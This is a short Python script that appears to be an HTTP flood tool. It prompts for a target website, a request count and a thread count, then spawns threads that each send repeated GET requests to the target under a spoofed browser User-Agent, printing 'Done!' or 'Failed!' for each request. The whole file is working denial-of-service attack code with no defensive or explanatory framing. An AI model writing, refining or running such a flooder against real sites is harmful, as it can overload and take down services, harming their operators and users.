import requests, time, random, threading, colorama
from colorama import Fore
from colorama import init as colorama_init

colorama_init(autoreset=True)

colorama.init()

website = input(f"{Fore.GREEN}Website: ")
requestcount = input(f"{Fore.GREEN}How many request: ")
threadcount = input(f"{Fore.GREEN}How many threads: ")

def main():
    count = 0
    agents = [
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
    ]
    randomchoice = random.choice(agents)
    for i in range(int(requestcount)):
        #time.sleep(1)
        count += 1
        headers = {
            'User-Agent': f'{randomchoice}'
        }
        try:            
            requests.get(f"{website}", headers=headers)
            print(f"{Fore.GREEN}Done! ID: {count}")
            print(f"{Fore.GREEN}Agent: {randomchoice}")
        except:
            print(f"{Fore.RED}Failed!")
            pass
    
    
def threadmaster():
    for i in range(int(threadcount)):
        threading.Thread(target=main).start()
        
threadmaster()
